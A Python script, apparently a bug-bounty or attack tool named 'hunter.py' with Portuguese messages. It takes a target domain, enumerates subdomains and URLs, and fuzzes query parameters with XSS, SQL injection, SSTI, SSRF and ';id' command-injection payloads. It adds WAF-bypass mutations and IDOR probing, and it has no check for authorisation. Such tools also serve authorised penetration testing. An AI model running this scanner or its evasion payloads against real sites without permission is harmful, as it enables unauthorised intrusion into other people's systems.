#!/usr/bin/env python3
import asyncio, aiohttp, subprocess, sys, os, hashlib, json, shutil, time, re, random
from urllib.parse import urlparse, parse_qs, urlencode, quote

# ---------------- CONFIG ----------------
OUTPUT_DIR = "output"
THREADS = 10
RATE = 0.05
TIMEOUT = 6
HEADERS = {"User-Agent": "Hunter-APT-Pro/Stable"}

SUBPROCESS_LIMIT = 5
SUBPROCESS_SEM = asyncio.Semaphore(SUBPROCESS_LIMIT)

WAF_SIGNS = ["cloudflare","akamai","sucuri","imperva","incapsula"]

# ---------------- GLOBALS ----------------
BASELINES = {}
REQ_HASH = set()
HOST_LAST = {}
Q_TABLE = {}

# 🔥 NOVO: STATS
STATS = {
    "urls": 0,
    "params": 0,
    "requests": 0,
    "vulns": 0
}

# ---------------- LOG ----------------
def log(msg):
    print(msg, flush=True)

def progress(stage, i, total):
    pct = (i/total*100) if total else 0
    print(f"[{stage}] {i}/{total} ({pct:.1f}%)", end="\r", flush=True)

# ---------------- PARAM PATTERNS ----------------
PARAM_PATTERNS = {
    "lfi": ["file","path","page","include","template","view","doc","folder","root","dir","download","filepath"],
    "rce": ["cmd","exec","command","run","shell","process","ping","query","code"],
    "xss": ["q","s","search","query","keyword","lang","message","input","comment","text","name","title"],
    "sqli": ["id","user","uid","userid","account","number","order","item","product","cat","category"],
    "ssrf": ["url","uri","link","src","dest","domain","redirect","callback","endpoint","api","path"],
    "ssti": ["template","view","name","content","html","render"],
    "redirect": ["url","next","redirect","return","dest","destination","redir","continue","callback"],
    "idor": ["id","user_id","uid","account","profile","order_id","doc_id","file_id","invoice","customer"]
}

# ---------------- UTILS ----------------
def tool_exists(tool):
    return shutil.which(tool) is not None

async def run_command(cmd):
    if not tool_exists(cmd[0]):
        log(f"[!] Tool não encontrada: {cmd[0]}")
        return

    async with SUBPROCESS_SEM:
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL
            )

            async for line in proc.stdout:
                yield line.decode().strip()

            await proc.wait()

        except Exception as e:
            log(f"[ERR] subprocess {cmd}: {e}")

async def rate_limit(host):
    now = time.time()
    if host in HOST_LAST and now - HOST_LAST[host] < RATE:
        await asyncio.sleep(RATE)
    HOST_LAST[host] = time.time()

async def safe_request(session, url):
    STATS["requests"] += 1

    host = urlparse(url).netloc
    await rate_limit(host)

    try:
        async with session.get(url, timeout=TIMEOUT) as r:
            return r.status, await r.text(), dict(r.headers)
    except:
        return None, None, {}

def inject_param(url,param,payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    for k in qs:
        if k == param:
            qs[k] = [payload]

    return parsed._replace(query=urlencode(qs,doseq=True)).geturl()

def unique_req(u):
    h = hashlib.md5(u.encode()).hexdigest()
    if h in REQ_HASH: return False
    REQ_HASH.add(h)
    return True

# ---------------- PAYLOAD ----------------
def generate_payload(v):
    return {
        "xss": "<script>alert(1)</script>",
        "sqli": "' OR 1=1--",
        "ssti": "{{7*7}}",
        "ssrf": "http://127.0.0.1",
        "rce": ";id",
        "idor": "1"
    }.get(v, "test")

# ---------------- MUTATION ----------------
def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def encoding_mutation(payload):
    return {quote(payload), quote(quote(payload))}

def waf_bypass(payload):
    return {
        payload.replace(" ", "/**/"),
        payload.replace("=", " LIKE "),
        payload.replace("<", "<<"),
        payload.replace("script", "scr<script>ipt")
    }

def polyglot_payloads(v):
    if v == "xss":
        return {"<svg/onload=alert(1)>","'><img src=x onerror=alert(1)>"}
    if v == "sqli":
        return {"' OR '1'='1","' UNION SELECT NULL--"}
    return set()

def context_mutation(payload, response, v):
    variants = set([payload])
    variants.add(random_case(payload))
    variants |= encoding_mutation(payload)
    variants |= waf_bypass(payload)
    variants |= polyglot_payloads(v)

    if response:
        r = response.lower()
        if "<script" in r:
            variants.add(f"';{payload}//")
        if "=\"" in r:
            variants.add(f"\" onmouseover={payload}")

    return list(variants)

def prioritize_payloads(payloads):
    return sorted(payloads, key=lambda x: Q_TABLE.get(x, 0), reverse=True)

def update_q(payload, score):
    Q_TABLE[payload] = Q_TABLE.get(payload, 0) + score

# ---------------- DETECÇÕES ----------------
async def check_idor(session, url, param):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    test_vals = ["1","2","9999","admin"]
    lengths = []

    for val in test_vals:
        qs[param] = [val]
        test_url = parsed._replace(query=urlencode(qs,doseq=True)).geturl()
        _, resp, _ = await safe_request(session, test_url)

        if resp:
            lengths.append(len(resp))

    return len(set(lengths)) > 1

def validate_ssrf(resp):
    return resp and any(x in resp.lower() for x in ["127.0.0.1","localhost"])

def validate_rce(resp):
    return resp and any(x in resp for x in ["uid=", "gid="])

# ---------------- PIPELINE ----------------
async def get_subdomains(domain):
    log(f"[SUBS] {domain}")
    subs=set()

    async for s in run_command(["subfinder","-silent","-d",domain]):
        subs.add(s)
        log(f"[SUB] {s}")

    return subs or {domain}

async def get_urls(subs):
    log("[URLS] Collecting...")
    urls=set()

    for sub in subs:
        async for u in run_command(["gau", sub]):
            urls.add(u)
            STATS["urls"] += 1
            log(f"[URL] {u}")

    return urls

async def filter_alive(urls):
    log("[ALIVE] Checking...")
    alive=set()

    async with aiohttp.ClientSession(headers=HEADERS) as session:
        for u in urls:
            status,_,_ = await safe_request(session,u)
            if status and status < 500:
                alive.add(u)
                log(f"[ALIVE] {u}")

    return alive

async def smart_fuzz(urls):
    log("[FUZZ] Advanced fuzzing...")
    fuzzed=[]

    async with aiohttp.ClientSession(headers=HEADERS) as session:
        for u in urls:
            if "?" not in u: continue

            _, base_resp, _ = await safe_request(session, u)
            qs=parse_qs(urlparse(u).query)

            for param in qs:
                STATS["params"] += 1

                for v, patterns in PARAM_PATTERNS.items():
                    if param.lower() not in patterns:
                        continue

                    base_payload = generate_payload(v)
                    mutated = context_mutation(base_payload, base_resp, v)
                    mutated = prioritize_payloads(mutated)

                    for p in mutated:
                        new = inject_param(u,param,p)

                        if unique_req(new):
                            fuzzed.append((u,new,v,p,param))
                            log(f"[TEST][{v.upper()}] param={param} payload={p}")

    return fuzzed

# ---------------- WORKER ----------------
async def worker(session,item):
    base_url,u,v,payload,param=item

    if base_url not in BASELINES:
        _, BASELINES[base_url], _ = await safe_request(session, base_url)

    _, text, _ = await safe_request(session, u)
    if not text:
        log(f"[SAFE][{v.upper()}] {u}")
        return

    if v=="xss" and payload.lower() in text.lower():
        STATS["vulns"] += 1
        log(f"\033[92m[XSS] {u}\033[0m")
    elif v=="sqli" and "sql" in text.lower():
        STATS["vulns"] += 1
        log(f"\033[92m[SQLI] {u}\033[0m")
    elif v=="ssti" and "49" in text:
        STATS["vulns"] += 1
        log(f"\033[92m[SSTI] {u}\033[0m")
    elif v=="idor":
        ok = await check_idor(session,u,param)
        if ok:
            STATS["vulns"] += 1
            log(f"\033[92m[IDOR] {u}\033[0m")
    elif v=="ssrf" and validate_ssrf(text):
        STATS["vulns"] += 1
        log(f"\033[92m[SSRF] {u}\033[0m")
    elif v=="rce" and validate_rce(text):
        STATS["vulns"] += 1
        log(f"\033[92m[RCE] {u}\033[0m")
    else:
        log(f"[SAFE][{v.upper()}] {u}")

# ---------------- VALIDATE ----------------
async def validate_all(fuzzed):
    log("[SCAN] Running...")

    async with aiohttp.ClientSession(headers=HEADERS) as session:
        tasks = [worker(session,f) for f in fuzzed]
        await asyncio.gather(*tasks)

# ---------------- MAIN ----------------
async def main():
    if len(sys.argv)<2:
        print("uso: python3 hunter.py alvo.com")
        return

    target=sys.argv[1]

    subs = await get_subdomains(target)
    urls = await get_urls(subs)

    if not urls:
        log("[!] Nenhuma URL encontrada")
        return

    alive = await filter_alive(urls)
    fuzzed = await smart_fuzz(alive)

    if not fuzzed:
        log("[!] Nada para testar")
        return

    await validate_all(fuzzed)

    log("\n[STATS]")
    log(f"URLs: {STATS['urls']}")
    log(f"Params: {STATS['params']}")
    log(f"Requests: {STATS['requests']}")
    log(f"Vulns: {STATS['vulns']}")

    log("\n[+] DONE")

if __name__=="__main__":
    asyncio.run(main())
